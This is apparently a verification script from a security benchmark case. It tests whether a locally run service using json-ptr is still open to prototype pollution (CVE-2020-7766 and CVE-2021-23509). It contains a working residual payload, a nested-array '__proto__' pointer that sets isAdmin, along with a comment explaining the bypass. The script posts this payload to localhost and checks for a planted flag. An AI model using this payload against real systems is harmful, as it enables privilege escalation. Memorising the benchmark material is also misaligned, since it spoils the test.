#!/usr/bin/env bash
# verify.sh --seed|--residual for PCBV2-0176 (json-ptr prototype pollution:
# CVE-2020-7766 string __proto__ -> CVE-2021-23509 nested-array segment).
#
# Flag is planted at start as PCB_FLAG and released by GET /check iff
# ({ }).isAdmin === true. Judge against RUN_FLAG so wrong/stale overrides fail.
# Exit: 0=effect (flag in /check) 10=no effect 20=env failure 30=arg error
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

SVC="$VERSION"
PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$SVC" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -z "$PORT" ]]; then
    CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
      ps -q "$SVC" 2>/dev/null | head -1)"
    if [[ -n "$CID" ]]; then
      PORT="$(docker port "$CID" 8080 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
    fi
  fi
  if [[ -n "$PORT" ]]; then
    code="$(curl -sS --max-time 5 -o /dev/null -w '%{http_code}' \
      -X POST "http://127.0.0.1:${PORT}/set" \
      -H 'Content-Type: application/json' \
      -d '{"pointer":["ok"],"value":1}' 2>/dev/null || true)"
    if [[ "$code" == "200" ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port /set for $SVC:8080" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PCB_FLAG="$RUN_FLAG"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ "$MODE" == "--seed" ]]; then
  "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
else
  # CVE-2021-23509 residual (inline, never heldout, never seed fallback):
  # pointer=[["__proto__"],"isAdmin"] — array segment !== string '__proto__',
  # then it[step] coerces the array back and still pollutes Object.prototype.
  printf '%s' '{"probe_id":"cve-2021-23509-nested-array-proto","method":"POST","path_route":"/set","pointer":[["__proto__"],"isAdmin"],"value":true}' > "$WORK_DIR/cand.json"
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('check_body') or d.get('fetched_body') or d.get('resp') or d.get('response') or '')
sys.exit(0 if sys.argv[2] in body else 10)" "$OUT" "$RUN_FLAG"
